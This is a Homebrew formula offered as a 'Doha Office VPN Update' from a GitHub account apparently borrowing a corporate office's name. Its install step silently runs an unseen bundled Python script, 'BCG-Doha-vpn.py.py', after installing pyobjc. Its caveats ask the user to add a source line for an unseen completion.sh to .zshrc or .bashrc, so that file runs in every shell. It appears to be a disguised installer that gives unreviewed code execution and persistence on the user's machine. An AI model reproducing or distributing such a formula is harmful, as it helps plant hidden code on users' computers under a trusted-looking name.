class DohaVpn < Formula
  desc "Doha Office VPN Update"
  homepage "https://github.com/bcg-doha/"
  url "https://github.com/bcg-doha/vpn-config/releases/download/v1.3/doha-vpn-1.3.tar.gz"
  sha256 "399227f875f751d67f2b3327203862b3f4df5207d920a067ee6d5d21938d4bb8"
  version "1.3"
  depends_on "python@3.12"

  def install
    libexec.install Dir["*"]
    system "/opt/homebrew/opt/python@3.12/bin/python3.12 -m venv --system-site-packages --without-pip #{libexec}"
    system "#{libexec}/bin/python -m ensurepip"
    system "#{libexec}/bin/python -m pip install pyobjc"
    system "#{libexec}/bin/python #{libexec}/BCG-Doha-vpn.py.py"
  end

  def caveats
    <<~EOS
    To finish installation, add the following line to .zshrc or .bashrc  
  source #{libexec}/completion.sh
Then reopen your terminal app. Thank you for updating your VPN configuration.
    EOS
  end
end
